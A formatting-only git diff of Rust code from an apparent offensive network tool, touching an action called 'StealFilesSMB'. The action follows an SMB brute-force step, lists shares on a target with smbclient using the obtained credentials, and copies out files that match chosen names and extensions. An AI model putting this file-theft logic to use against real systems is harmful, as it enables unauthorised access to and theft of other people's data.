@@ -13,9 +13,15 @@ use super::{build_output_dir, get_credentials};
 pub struct StealFilesSmb;
 
 impl Action for StealFilesSmb {
-    fn name(&self) -> &'static str { "StealFilesSMB" }
-    fn port(&self) -> Option<u16> { Some(445) }
-    fn parent(&self) -> Option<&'static str> { Some("SMBBruteforce") }
+    fn name(&self) -> &'static str {
+        "StealFilesSMB"
+    }
+    fn port(&self) -> Option<u16> {
+        Some(445)
+    }
+    fn parent(&self) -> Option<&'static str> {
+        Some("SMBBruteforce")
+    }
 
     fn execute<'a>(
         &'a self,
@@ -44,7 +50,10 @@ async fn run(target: &Target, state: &Arc<AppState>) -> ActionOutcome {
         }
 
         let result = timeout(Duration::from_secs(240), async {
-            steal_via_smb(&target.ip, user, password, file_names, file_exts, &local_dir).await
+            steal_via_smb(
+                &target.ip, user, password, file_names, file_exts, &local_dir,
+            )
+            .await
         })
         .await;
 
@@ -70,7 +79,13 @@ async fn steal_via_smb(
 ) -> Result<usize, String> {
     // Step 1: List shares
     let shares_output = tokio::process::Command::new("smbclient")
-        .args(["-L", ip, "-U", &format!("{user}%{password}"), "--timeout=10"])
+        .args([
+            "-L",
+            ip,
+            "-U",
+            &format!("{user}%{password}"),
+            "--timeout=10",
+        ])
         .output()
         .await
         .map_err(|e| e.to_string())?;
